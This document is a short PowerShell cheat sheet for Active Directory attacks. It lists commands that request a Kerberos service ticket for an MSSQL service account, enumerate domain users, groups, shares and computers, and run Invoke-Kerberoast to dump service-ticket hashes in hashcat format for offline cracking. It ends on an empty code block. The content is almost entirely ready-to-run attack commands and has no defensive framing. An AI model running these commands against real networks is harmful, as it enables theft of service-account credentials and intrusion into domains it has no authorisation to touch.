Windows Powershell Commands
*****************************

Request Service Ticket with Kerberos

.. code-block::console

   Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/xor-app23.xor.com:1433'

Enumerate Users

.. code-block::console

   Get-NetUser | select cn

Enumerate Groups

.. code-block::console

   Get-NetGroup

Enumerate shared folders

.. code-block::console

   Get-NetShare

Find other computers in the network

.. code-block::console

   Get-NetComputer

Find other OS in network

.. code-block::console

        Get-NetComputer -fulldata | select operatingsystem

Find Windows OS name and other info

.. code-block:: console

   systeminfo /fo csv | ConvertFrom-Csv | select OS*, System*, Hotfix* | Format-List

Invoke Kerberos and the krg5t hash

.. code-block:: console

   Import-Module .\Invoke-Kerberoast.ps1 ; Invoke-Kerberoast -Identity sqlServer -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.txt

Invoke-kerberos.ps1 file

.. code-block:: console
